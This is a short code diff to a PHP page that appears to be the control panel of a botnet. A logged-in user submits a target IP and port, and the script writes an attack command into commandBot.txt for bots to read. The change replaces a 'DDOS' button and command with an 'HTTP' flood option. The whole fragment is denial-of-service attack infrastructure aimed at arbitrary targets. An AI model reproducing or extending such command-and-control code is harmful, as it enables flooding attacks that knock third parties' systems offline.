@@ -258,7 +258,8 @@ if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
             />
             <p class="port_error"> </p>
           </div>
-          <button class="form_button" type="submit">DDOS</button>
+          <input class="form_button" name="http" type="submit" value="HTTP"/>
+
         </div>
           </form>
           <button class="content_back" onclick="history.back()">Go Back</button>
@@ -326,10 +327,10 @@ if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
 </html>
 ';
   if (
-    isset($_REQUEST['ip']) && isset($_REQUEST['port'])
+    isset($_REQUEST['ip']) && isset($_REQUEST['port']) && isset($_REQUEST['http'])
   ) {
     $fp = fopen('commandBot.txt', 'w');
-    fwrite($fp, "ddos");
+    fwrite($fp, "http");
     fwrite($fp, '&');
     fwrite($fp, $_REQUEST['ip']);
     fwrite($fp, ':');
